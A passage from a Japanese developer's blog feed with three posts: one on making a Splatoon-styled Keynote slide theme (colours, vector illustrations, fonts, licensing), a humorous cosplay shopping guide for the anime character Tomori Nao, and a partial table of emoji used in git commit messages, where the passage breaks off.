<p>実践イカパケット解析が何かわからない方々へ、詳しくはイカのスライドをご覧になってください。</p>

<iframe src="//www.slideshare.net/slideshow/embed_code/key/41a5AKyCSyVAid" width="595" height="485" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>


<p> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/mzyy94/packetoon" title="実践イカパケット解析" target="_blank">実践イカパケット解析</a> </strong> from <strong><a href="//www.slideshare.net/mzyy94" target="_blank">Yuki Mizuno</a></strong> </div></p>

<p>このスライドを公開したところ、各所にていろいろな反響がありました。
技術的な批評がたくさんあるなか、非技術的な反応もありました。
その中でも多かったのがイカのような反応です。</p>

<blockquote><p>恐ろしくスライドのデザインクオリティが高いw</p>

<p>このスライドテンプレートほしい。</p></blockquote>

<p>是非ともこの期待に応えたいと思ったので、Splatoonっぽいスライドテーマを作成し、公開しました。</p>

<!-- more -->


<h1>Splatoonっぽいスライドテーマ</h1>

<p>イカのリポジトリにて公開しています。</p>

<p><a href="https://github.com/mzyy94/Slidoon"><strong>mzyy94/Slidoon</strong></a></p>

<p>主にOS XでKeynoteを使ってスライドを作っているため、Advent Calendar 8日目までにはKeynote向けのテーマしか作成できていませんが、
みなさんの反応によってはPowerPoint用のものも作成しようかと思っております。</p>

<h2>Slidoonテーマの作成について</h2>

<p>「スライドテーマ公開しました。」だけではAdvent Calendarの記事としてあまりにも内容が無さすぎるため、Splatoonっぽいスライドテーマ作成についていろいろと述べていきいます。</p>

<h3>Splatoonっぽい色</h3>

<h4>背景色</h4>

<p>Splatoonはあの鮮やかなインクの色が楽しさを引き立てている重要な役割を担っています。
だからと言って、スライド全体をSplatoonのゲームパッケージのようなオレンジと青のようなビビッドな色で染めるのも聴講者の目を痛める原因となるだけなので、落ち着いた色をベースに使う必要があります。
どこかにSplatoonっぽいけど落ち着いた色を使って見せるよい参考資料はないかと探していたところ、任天堂のSplatoon公式サイトに行き当たりました。</p>

<p><a href="https://www.nintendo.co.jp/wiiu/agmj/battle/index.html">Splatoon（スプラトゥーン） | ナワバリバトル</a></p>

<p>トップページはパッケージと同じオレンジと青の鮮やかな色使いで注目させるようになっていましたが、説明の多いナワバリバトルの紹介ページでは、グレーの落ち着いた背景を用いていました。
一目見て、彩度の高い色を使っているわけではないのに、ものすごくSplatoonをイメージするのにしっくりくると感じました。
それもそのはず、インクを塗る前のステージの地面は大抵暗い色であるからです(マヒマヒを除く)。</p>

<p>これは使えるぞ！と思い、カラーピッカーを取り出し、採色しました。
RGBで、ベースのグレーは #2A2A2A、水玉模様のグレーは #212121であることがわかりました。</p>

<p>手作業で楕円の図形を追加してはサイズを調整し、カラーを #212121 にすることでなんとか背景を作り上げることができました。
一見スライドの背景は一枚のイラストに見えますが、実はグループ化した楕円の集まりなんです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/12/08/slidoon-background.png" alt="楕円の集まり" /></p>

<h4>インクの色</h4>

<p>ベースが落ち着いた色であるからには、強調すべきところに鮮やかインクカラーを用いたいところです。
そして、どんな色が使われているか知るるために、実際のゲーム画面から採色してみたいと思いました。
そんなときに役立ったのが、<a href="https://blog.fetus.jp/201512/30.html">一昨日のSplatoon Advent Calendarの記事</a>で紹介のあった、<a href="https://stat.ink/">stat.ink</a>です。
Splatoonの戦績を集計するのに加えて、最終結果の画面のキャプチャ画像も一緒に登録できているため、<a href="https://stat.ink/u/mzyy94">自分の結果</a>をひとつずつチェックしがてらカラーピッカー片手に色を集めていきます。
随分とたくさんの色があつまったのですが、Keynoteのカラーテーマの登録数はベース6色バリエーション4パターンの24色を登録するようにできていたので、似た色を排除、足りないバリエーションの色を自分で考えて24色揃えました。
また、グラデーションも扱えるようになっていたので、24色からハイカラになるようなグラデーションの組み合わせを6種作成しました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/12/08/slidoon-colortheme.png" alt="カラーテーマ" /></p>

<p>どうやってカラーテーマの色を変更するのかがわからず長い時間躓いていましたが、現在の塗りつぶしの部分から下のカラーパレットにドラッグアンドドロップすると変えることができました。</p>

<h3>イラスト</h3>

<h4>イカのイラスト</h4>

<p>Splatoon = イカ なので、スライドに刺激を加えるためにイカのイラストが使いたい欲がでてきました。
しかしながらデザインセンスが皆無なため、最初に作成したイラストは散々な出来でした。（Slidoonのika4フォルダに†闇†が潜んでる)</p>

<p>ひとまず公式サイトなどで大体のイカの形を把握し、デザインセンスがなくても誤魔化せるようベクター形式で作成することにしました。
といってもドローイングソフトウェアを持っていなかったので、<a href="https://geo.itunes.apple.com/jp/app/graphic/id404705039?mt=12&amp;at=1l3v4mQ">Autodesk Graphic</a>を購入しました(3,600円)。</p>

<p>高価なソフトウェアを買ったおかげか、いくらかましなイラストができたので、実践イカパケット解析のスライドに散りばめる形で利用しました。
使いたい人がいるかどうかはわかりませんが、Slidoonのsquid8フォルダにPNG画像があります。</p>

<h4>インクの飛び散り</h4>

<p>インクの飛び散りイラストは絶対にどこかで使いたい！と思っていたのでスライド作成に必須のイラストでした。
実践イカパケット解析のスライドの箇条書き部分に登場しています。</p>

<p>デザインセンスがないため最初はCCライセンスのものを探してきて利用していたのですが、せっかくテーマを作成するのだからライセンスが混ざるのは管理しにくいと思ったので、この記事を執筆開始する前に3時間かけて自作しました。
3時間かけて出来上がったのがイカのイラストです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/12/08/splatter.png" alt="3時間の成果" /></p>

<p>「は？こんなイラスト作るのに3時間もかかったの？」　とお思いもしれませんが、すいません、デザインセンスが皆無なのでほんとに3時間かかりました。</p>

<p>出来上がったこのインク飛び散りイラストは、Slidoonの箇条書き部分に適用しています。</p>

<h4>Finishの帯</h4>

<p>実践イカパケット解析の発表の際は、最後のスライドを説明し終えたらゲームさながらの左右からFinish帯が張られるアニメーションで終了する凝ったギミックを導入していました。
このFinishのイラストも作成したものです。
といっても「Finish!」の文字デザインまで含めてではなく、文字はProject Paintballのフォントを利用しました。</p>

<p><a href="http://fizzystack.web.fc2.com/paintball-ja.html">プロジェクト・ペイントボール スプラトゥーン風アルファベットフォント</a></p>

<p>この利用規約にもあるように、Inkscapeでの描き起しであるものの、Project Paintballのフォントは任天堂の著作物のコピーに該当する可能性があるため、非営利目的のライセンスとなっており、同フォントを利用して作成したFinishの帯に関しても非営利での利用を強制させられます。
なのでSlidoonのライセンスも<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja">CC BY-NC-SA 4.0</a>になっていますが、このバナーを削除いただければ<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.ja">CC BY-SA 4.0</a>としてお使いいただけます。</p>

<h3>フォント</h3>

<p>実践イカパケット解析のスライドでは英数字記号のフォントに<a href="http://fizzystack.web.fc2.com/paintball-ja.html">Project Paintball</a>、ひらがなとかたかなに<a href="http://aramugi.com/?page_id=807">イカモドキ</a>、漢字に<a href="https://www.google.com/get/noto/">Noto Sans CJK JP</a>の極太字を利用しています。
ライセンスの都合でこれらのフォントを同梱できないため、SlidoonではフォントをNoto Sans CJK JPを導入してある環境向けにテーマのベースフォントを指定しています。</p>

<p>実際に実践イカパケット解析のスライドもNoto Sans CJK JPをベースとしたフォントテーマで文字を入力し、ひらがなかたかなの部分を手動でイカモドキに変更、英数字記号を手動でProject Paintballに変更する形で作成してきました。
そのため、文字にこだわる方はそのようにして作成していただくか、Fontforge等で上記3フォントを合成したフォントを用いるなりで対処してください。</p>

<p>また、Splatoonで実際に使われているフォントは取扱説明書によると、フォントワークス株式会社のフォントを利用しているようで、探してみたところロウディEBを利用しているようでした。</p>

<p><a href="http://fontworks.co.jp/font/catch/rowdy/EB.html">ロウディ EB | キャッチ | 書体を選ぶ | FONTWORKS</a></p>

<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">SplatoonのフォントはフォントワークスのロウディEBか&#10;<a href="https://t.co/KjnMGhtsm6">https://t.co/KjnMGhtsm6</a> <a href="https://t.co/2MYBNp1CVm">pic.twitter.com/2MYBNp1CVm</a></p>&mdash; 【ピュア】友利奈緒 (@mzyy94) <a href="https://twitter.com/mzyy94/status/662520841326845952">2015, 11月 6</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>すでにこのフォントを持っている方は、お手数ですがSlidoonのNoto Sans CJK JPのフォント指定を全てそちらに変更いただくと、よりSplatoonっぽいスライドが作成できるかと思います。</p>

<p>また、学生の方はフォントワークス社のフォントが非商用利用で4年間利用できるライセンスが5000円+税で契約できるので、イカしたスライドが作りたいならば契約をお勧めします。</p>

<p><a href="http://store.sbtlets.jp/sbtletsst/">SBT LETSストア 学生向け｜トップページ</a></p>

<h2>まとめ</h2>

<p>実践イカパケット解析のスライドを作成する時間のほうがパケットを解析する時間より長くなってしまったので、ぜひともこの努力を無駄にしないためにもSlidoonテーマをみんな使って欲しいです。。。</p>

<hr />

<p>さて、以上がSplatoon Advent Calendar 8日目の記事でした。
前日・前々日と技術的な話が続いていましたが箸休めになったでしょうか。</p>

<p>明日は<a href="https://twitter.com/holygrail">HoryGrail</a>さんのウデマエS+を目指す話です。
煽りイカは好きじゃないのでハードルは上げず、このままバトンタッチします。</p>

<p>それでは、マンメンミ！</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[友利奈緒「いままでとこれから」]]></title>
    <link href="http://mzyy94.com/blog/2015/12/01/tomorinao/"/>
    <updated>2015-12-01T19:33:05+09:00</updated>
    <id>http://mzyy94.com/blog/2015/12/01/tomorinao</id>
    <content type="html"><![CDATA[<p>友利奈緒のみなさま、おひさしぶりです。友利奈緒です。
夏の友利奈緒展の時はとても笑顔で皆さん元気でしたがいかがお過ごしでしょうか。</p>

<p>Charlotteの放映が終わり2ヶ月が経ち、友利奈緒の各家庭にもCharlotte Blu-ray 3巻が届いているかと思います。
テレビでは見られなかったあんな友利奈緒やこんな友利奈緒をキャラクターコメンタリーで堪能いただいているかと思いますが、そんなかわいい友利奈緒を見ていて想うことはありませんか？</p>

<p><strong>友利奈緒になりたい</strong></p>

<p>そんな友利奈緒の、友利奈緒による、友利奈緒のための<a href="http://www.adventar.org/calendars/779">友利奈緒 Advent Calendar</a> 1日目の記事は、友利奈緒の「いままでとこれから」です。</p>

<!-- more-->


<p><img src="http://mzyy94.com/blog/resources/images/2015/12/01/tomorinao-ten.jpg" alt="友利奈緒展" /></p>

<p>（記事中の友利奈緒画像はCharlotte原画展で撮影したものになります。)</p>

<h1>友利奈緒になるには （いままで）</h1>

<p>友利奈緒になるためのいままでの記録です。</p>

<h2>星ノ海学園女子制服</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2015/12/01/schooluniform.jpg" alt="星ノ海学園女子制服" /></p>

<p>友利奈緒になるためにまず必要なものとして、彼女が生徒会長を務める星ノ海学園の女子制服があげられます。
星ノ海学園女子制服は公式ライセンス商品として販売されており以下のサイトからオンラインで購入できます。
つい先日までLサイズが売り切れていましたが、追加生産があったのか、12/1 19:00現在で在庫ありとなっています。</p>

<p><a href="https://www.acos.me/products/detail.php?product_model_id=12522">Charlotte 星ノ海学園制服(女子冬服) コスプレ衣装 | ACOSオンラインショップ</a></p>

<p>オンラインで購入するのはちょっと気がひけるという友利奈緒さんは、秋葉原や池袋にあるacosの店舗に足を運んで実物を確認してみるといいかもしれません。</p>

<p>ちなみにLサイズは身長163cmの男性に丁度いい大きさでした。参考までに。</p>

<blockquote class="twitter-tweet" lang="ja"><p lang="und" dir="ltr"><a href="https://t.co/y2yns2RgMP">pic.twitter.com/y2yns2RgMP</a></p>&mdash; 【公式】友利奈緒 (@mzyy94) <a href="https://twitter.com/mzyy94/status/669537697606664192">2015, 11月 25</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<h2>ハイソックス</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2015/12/01/tomorinao-1.jpg" alt="友利奈緒" /></p>

<p>友利奈緒の履いてるハイソックスは黒系の濃いブラウンもしくはネイビーです。何度もコマ送りして製品の特定を試みたのですが、これだと断定できるものはなく、結果一般的なハイソックスを購入することにしました。
おそらく友利奈緒自身もハイソックスにこだわりはないはずです。</p>

<p><a href="http://www.amazon.co.jp/dp/B011BRVFCC/?tag=mzyy-22">(プレイボーイ)PLAYBOY PLAYBOY ワンポイント スクールソックス 36cm丈 3722344 82 ネイビー×ブルー 23-25cm : 服＆ファッション小物通販 | Amazon.co.jp</a></p>

<p>始め28cm丈を購入したのですが、少々短く、贈り物でいただいた36cm丈だと丁度よくフィットし、より友利奈緒に近づけた気持ちになります。</p>

<h2>きれいな脚</h2>

<p>人を蹴り飛ばしてくれるきれいな脚に惹かれて友利奈緒になった方も多いかと思います。
あのきれいな脚を維持するには永久脱毛を行うのが確実ですが、そうはいかない友利奈緒もいるかとおもいます。
そんな時にオススメなのが、除毛クリーム。</p>

<p><a href="http://www.amazon.co.jp/gp/product/B0036ZBRVC/?tag=mzyy-22">Amazon.co.jp： ヴィート バスタイム 除毛クリーム 敏感肌用 150g (Veet In Shower Hair Removal Cream Sensitive 150g): ヘルス&amp;ビューティー</a></p>

<p>友利奈緒の肌は敏感なのでこの敏感肌用がオススメであると、友利奈緒の友人に聞きました。
弱酸性のボディーソープしか使えない友利奈緒が実際に使ってみたところ、特に肌が荒れることも発疹ができることもなく、きれいな友利奈緒の脚になりました。</p>

<h2>輝かしい碧眼</h2>

<p>「あの瞳すき。」友利奈緒を見ていてそう思うこともあったでしょう。
一般にこの時間軸の日本人は碧い瞳を生まれながらに備えていることはないため、ここはカラーコンタクトを用います。
これも友利奈緒の友人からのアドバイスで、以下のカラーコンタクトがいいのではないかとおすすめをいただきました。</p>

<p><a href="http://airily.jp/shop/g/g4537675938001/">クオリテ　ワンデー　ベーシック ブルーサファイア(10枚，度無し): カラコンコスプレウィッグ 通販の【エアリー】V系・コスプレ</a></p>

<p>カラーコンタクトをつけるに当たって、一度眼科に行ってベースカーブや装着に関して相談をしてから友利奈緒を目指しましょう。</p>

<h2>美しい銀髪</h2>

<p>友利奈緒のかわいいポイントとして注目される美しい銀髪。
需要が高く複数の供給を受けているのですが、こればかりは実際に見て美しさを確認して購入して欲しいので、おすすめを紹介することはできません。</p>

<h2>履き慣れたブーツ</h2>

<p>暖かそうな日でも毎日履いている革製(おそらく)のブーツ。友利奈緒になるために毎日履きたいのですが、コスプレ用の靴しか見つからず、
しっかりとした作りの友利奈緒ブーツが購入できずにいます。</p>

<p>困っている友利奈緒(複数形)のためにも、<strong>有力な情報を求めています。</strong>
よろしくお願いいたします。</p>

<h2>ビデオカメラ・携帯電話・MP3プレイヤー</h2>

<p>こちらはまだ買い揃えてないのですが、商品の特定がなされています。</p>

<h3>ビデオカメラ</h3>

<p><img src="http://mzyy94.com/blog/resources/images/2015/12/01/handycamera.jpg" alt="ビデオカメラ" /></p>

<p>ビデオカメラはSONYの DCR-DVD508と酷似しているとの報告がちらほら上がっています。</p>

<p><a href="https://www.sony.jp/support/handycam/products/dcr-dvd508/">DCR-DVD508 | 機種別サポート | デジタルビデオカメラ ハンディカム | サポート・お問い合わせ | ソニー</a></p>

<p>Amazonでの相場が5万円を超えているため、軽い気持ちでは購入できず、現在検討中です。</p>

<p><a href="http://www.amazon.co.jp/dp/B000MRAAXI?tag=mzyy-22">Amazon.co.jp｜ソニー デジタルビデオカメラレコーダー(DVD) DCR-DVD508｜カメラ通販</a></p>

<h3>携帯電話</h3>

<p><img src="http://mzyy94.com/blog/resources/images/2015/12/01/smartphone.jpg" alt="スマートフォン" /></p>

<p>携帯電話はKDDIのIS12T。友利奈緒はパープルカラーを持っていますが、公式ラインナップにはありません。</p>

<p><a href="http://www.au.kddi.com/mobile/product/archive/smartphone/dp/is12t/">Windows (R) Phone（ウィンドウズフォン） IS12T | 製品アーカイブ | au</a></p>

<h3>MP3プレイヤー</h3>

<p><img src="http://mzyy94.com/blog/resources/images/2015/12/01/mp3player.jpg" alt="MP3プレイヤー" /></p>

<p>MP3プレイヤーは生産終了品で、加えてパープルカラーは未発売のため、揃えるのは少々難があります。
<a href="http://www.kenwood.com/jp/products/audio/personal/mg_g508/index_end.html">MG-G508（生産完了商品）｜ポータブルオーディオ｜オーディオ｜生産完了商品一覧｜商品情報｜株式会社JVCケンウッド</a></p>

<p><a href="http://www.amazon.co.jp/s/ref=nb_sb_noss?field-keywords=KENWOOD+MG-G508&amp;tag=mzyy-22">Amazon.co.jp: KENWOOD MG-G508</a></p>

<h1>友利奈緒としての生活 （これから）</h1>

<p>2015年12月は我ら友利奈緒関連のイベントが沢山あります。一つ一つ細かく説明はできないので、詳しくはリンクを辿ってみてください。</p>

<h2>12/5-6 SECCONオンライン予選 チームTomoriNao</h2>

<p><a href="http://2015.seccon.jp/seccon2015-online-ctf.html">SECCON 2015 オンライン予選(24時間CTF)開催 | SECCON 2015 NEWS</a></p>

<h2>12/8-20 展示会 「Charlotte ―いままでの記憶、これからの記録展」</h2>

<p><a href="http://pa-works.jp/news/">新着情報 - NEWS | 株式会社ピーエーワークス 公式サイト - P.A.WORKS Co.,Ltd. Web Site</a></p>

<h2>12/13 Charlotte設定資料集＆原画集セット発売</h2>

<p><a href="http://pa-works.jp/shopping/index.html#charlotte_yoyaku_set">ショップ - SHOPPING | 株式会社ピーエーワークス 公式サイト - P.A.WORKS Co.,Ltd. Web Site</a></p>

<h2>12/23 Charlotte Blu-ray 4巻発売</h2>

<p><a href="http://charlotte-anime.jp/bd-dvd/04.html">Blu-ray&amp;DVD | TVアニメ「Charlotte(シャーロット)」公式サイト</a></p>

<h2>12/23-26 Charlotteキャラクターケーキ発売</h2>

<p><a href="http://animesugar.jp/item/112.html">Charlotte（シャーロット）2015年限定クリスマスケーキ【限定クリスマスプレート付属】 ｜アニメ×スイーツ キャラクターケーキ専門店「あにしゅが」</a></p>

<h1>まとめ</h1>

<p>Enjoy友利奈緒！</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GitHubで絵文字コミットを続けてみて有用だったEmojiまとめ]]></title>
    <link href="http://mzyy94.com/blog/2015/10/14/emoji-commit-message/"/>
    <updated>2015-10-14T19:39:47+09:00</updated>
    <id>http://mzyy94.com/blog/2015/10/14/emoji-commit-message</id>
    <content type="html"><![CDATA[<p>みなさんは絵文字コミットというものをご存知でしょうか？
プロ生い人のサイトでも以下のように紹介されており、知っている人も多いと思いますが、GitHubで絵文字に置換される特定のワードをコミットメッセージに追加し、
ぱっと見でどういった種類の変更があったのかに気づきやすいようにするものです。</p>

<p><a href="http://pronama.azurewebsites.net/2015/06/20/github-emoji-commit-message/">GitHub で絵文字入りコミットメッセージを活用しているプロジェクトを調べてみた | プログラミング生放送</a></p>

<p>少し前から興味があったのですが、GitLabやBitBucketでプライベートなリポジトリで開発してるものでは絵文字として表示されないため、なかなか導入する機会がありませんでした。
先々月にブログで記事にしたKodi用Chinachu PVRクライアントadd-onの作成をパブリックなリポジトリで開発しようと思い立ったとき、
いい機会だと感じたので初期コミットから絵文字コミットメッセージを導入し始めました。</p>

<p><a href="https://github.com/mzyy94/pvr.chinachu/">mzyy94/pvr.chinachu - GitHub</a></p>

<p>コミットを続けていたら開発版ブランチが100コミットに近づいてきたので、いままで使ってきた絵文字コミットをまとめてみました。</p>

<!-- more -->


<h1>絵文字コミット</h1>

<h2>導入</h2>

<p>まず、GitHubでどのような文字列が絵文字に置換されるかですが、インターネット上の対応表を掲載しているサイトを見て対応付けしていました。
そのなかでも以下のサイトが特に見やすく、選択するとクリップボードにコピーされるので愛用していました。</p>

<p><a href="http://www.emoji-cheat-sheet.com/">Emoji cheat sheet for GitHub, Basecamp and other services</a></p>

<p>GitHubでは、コロンで挟む形で記述した文字列が対応する絵文字に変換されるようになっています。
絵文字コミットはパッと見て何を指しているかがわかるようにする目的で導入したため、コロンの間の文字列とミスマッチなものもあります。
反義語になるようなことは避けていますが、理解しがたいものも混ざってしまう点を導入時には覚悟しておかなければなりません。</p>

<h2>一覧</h2>

<p>以下のようにして、用いた絵文字を列挙して、どのような用途で使用したかを一覧にまとめました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>git log --oneline <span class="p">|</span> grep -o <span class="s1">&#39;:\w\+:&#39;</span> <span class="p">|</span> sort -u
</span></code></pre></td></tr></table></div></figure>


<p>今回のプロジェクトはPVR(Personal Video Recorder：ビデオレコーダー)を中心とするものなので、予約録画や番組視聴に関する絵文字コミットメッセージも多く導入しました。
それらに関しては一般的なプロジェクトにはそのままでは利用できないものであるため、末尾にまとめておきます。</p>

<h3>一般的な用途</h3>

<h4>バグ関連</h4>

<table>
<thead>
<tr>
<th style="text-align:center;"> 絵文字</th>
<th style="text-align:center;">   絵文字置換文字列         </th>
<th style="text-align:left;"> 用途                                                      </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/bug.png" alt="🐛" width="24" height="24" /> </td>
<td style="text-align:center;"> :bug:                      </td>
<td style="text-align:left;"> バグFixの時に用いる                                       </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/bangbang.png" alt="‼️" width="24" height="24" /> </td>
<td style="text-align:center;"> :bangbang:                 </td>
<td style="text-align:left;"> バグとは言い切れないけど何か悪いものを正しく修正した時    </td>
</tr>
</tbody>
</table>


<h4>コメントしづらい変更</h4>

<table>
<thead>
<tr>
<th style="text-align:center;"> 絵文字</th>
<th style="text-align:center;">   絵文字置換文字列         </th>
<th style="text-align:left;"> 用途                                                      </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/ok.png" alt="🆗" width="24" height="24" /> </td>
<td style="text-align:center;"> :ok:                       </td>
<td style="text-align:left;"> なにかokな変更                                            </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/cool.png" alt="🆒" width="24" height="24" /> </td>
<td style="text-align:center;"> :cool:                     </td>
<td style="text-align:left;"> なにかcoolな変更                                          </td>
</tr>
</tbody>
</table>


<h4>ファイル追加・削除・新規作成・移動</h4>

<table>
<thead>
<tr>
<th style="text-align:center;"> 絵文字</th>
<th style="text-align:center;">   絵文字置換文字列         </th>
<th style="text-align:left;"> 用途                                                      </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/new.png" alt="🆕" width="24" height="24" /> </td>
<td style="text-align:center;"> :new:                      </td>
<td style="text-align:left;"> ファイルの追加。主に新規作成したタイミングで。            </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/fire.png" alt="🔥" width="24" height="24" /> </td>
<td style="text-align:center;"> :fire:                     </td>
<td style="text-align:left;"> ファイルの削除。ソースコードの大半を削除した場合もこれ。  </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/inbox_tray.png" alt="📥" width="24" height="24" /> </td>
<td style="text-align:center;"> :inbox_tray:               </td>
<td style="text-align:left;"> ファイルの移動。他プロジェクトのファイルを持ってきた時とか</td>
</tr>
</tbody>
</table>


<h4>ドキュメントやライセンス関連</h4>

<table>
<thead>
<tr>
<th style="text-align:center;"> 絵文字</th>
<th style="text-align:center;">   絵文字置換文字列         </th>
<th style="text-align:left;"> 用途                                                      </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/copyright.png" alt="©" width="24" height="24" /> </td>
<td style="text-align:center;"> :copyright:                </td>
<td style="text-align:left;"> ライセンスの変更や追加。ライセンスファイルに関して。      </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/globe_with_meridians.png" alt="🌐" width="24" height="24" /> </td>
<td style="text-align:center;"> :globe_with_meridians:     </td>
<td style="text-align:left;"> 多言語対応ツールの設定や言語リソースの変更                </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/pencil.png" alt="✏️" width="24" height="24" /> </td>
<td style="text-align:center;"> :pencil:                   </td>
<td style="text-align:left;"> ドキュメントの変更。主にREADME                            </td>
</tr>
</tbody>
</table>


<h4>ビルドやデプロイ関係</h4>

<table>
<thead>
<tr>
<th style="text-align:center;"> 絵文字</th>
<th style="text-align:center;">   絵文字置換文字列         </th>
<th style="text-align:left;"> 用途                                                      </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/wrench.png" alt="🔧" width="24" height="24" /> </td>
<td style="text-align:center;"> :wrench:                   </td>
<td style="text-align:left;"> ビルドやデプロイの全般的な変更                            </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/package.png" alt="📦" width="24" height="24" /> </td>
<td style="text-align:center;"> :package:                  </td>
<td style="text-align:left;"> パッケージングに関する変更                                </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/apple.png" alt="🍎" width="24" height="24" /> </td>
<td style="text-align:center;"> :apple:                    </td>
<td style="text-align:left;"> OS XやiOSなどApple製品を対象とするのビルド関連変更        </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/computer.png" alt="💻" width="24" height="24" /> </td>
<td style="text-align:center;"> :computer:                         </td>
<td style="text-align:left;"> Deploy tagert system. Some processor              </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/space_invader.png" alt="👾" width="24" height="24" /> </td>
<td style="text-align:center;"> :space_invader:            </td>
<td style="text-align:left;"> Android向けのビルド関連変更                               </td>
</tr>
</tbody>
</table>


<h4>Gitバージョン管理</h4>

<table>
<thead>
<tr>
<th style="text-align:center;"> 絵文字</th>
<th style="text-align:center;">   絵文字置換文字列         </th>
<th style="text-align:left;"> 用途                                                      </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/arrow_right_hook.png" alt="↪️" width="24" height="24" /> </td>
<td style="text-align:center;"> :arrow_right_hook:         </td>
<td style="text-align:left;"> ブランチをマージしたり、Pull-Requestを取り込んだ時        </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/up.png" alt="🆙" width="24" height="24" /> </td>
<td style="text-align:center;"> :up:                       </td>
<td style="text-align:left;"> プロダクトのバージョンアップ。git tagとする時             </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/no_entry_sign.png" alt="🚫" width="24" height="24" /> </td>
<td style="text-align:center;"> :no_entry_sign:            </td>
<td style="text-align:left;"> トラッキングしない時に。.gitignoreの変更時                </td>
</tr>
</tbody>
</table>


<h4>依存関係</h4>

<table>
<thead>
<tr>
<th style="text-align:center;"> 絵文字</th>
<th style="text-align:center;">   絵文字置換文字列         </th>
<th style="text-align:left;"> 用途                                                      </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/arrow_heading_up.png" alt="⤴️" width="24" height="24" /> </td>
<td style="text-align:center;"> :arrow_heading_up:         </td>
<td style="text-align:left;"> 依存ライブラリや依存ツールのバージョンをあげる時。        </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/arrow_down.png" alt="⤵️" width="24" height="24" /> </td>
<td style="text-align:center;"> :arrow_down:               </td>
<td style="text-align:left;"> 依存ライブラリや依存ツールのバージョンを下げた時。        </td>
</tr>
</tbody>
</table>


<h4>数回使用したものの、ボツになったやつ</h4>

<table>
<thead>
<tr>
<th style="text-align:center;"> 絵文字</th>
<th style="text-align:center;">   絵文字置換文字列         </th>
<th style="text-align:left;"> 用途                                                      </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/arrows_counterclockwise.png" alt="🔄" width="24" height="24" /> </td>
<td style="text-align:center;"> :arrows_counterclockwise:  </td>
<td style="text-align:left;">  データのリロードに関する時など。長くて使いづらい。       </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/arrow_upper_left.png" alt="↖️" width="24" height="24" /> </td>
<td style="text-align:center;"> :arrow_upper_left:         </td>
<td style="text-align:left;"> バージョニングに関する変更とか。出番がもうない。          </td>
</tr>
<tr>
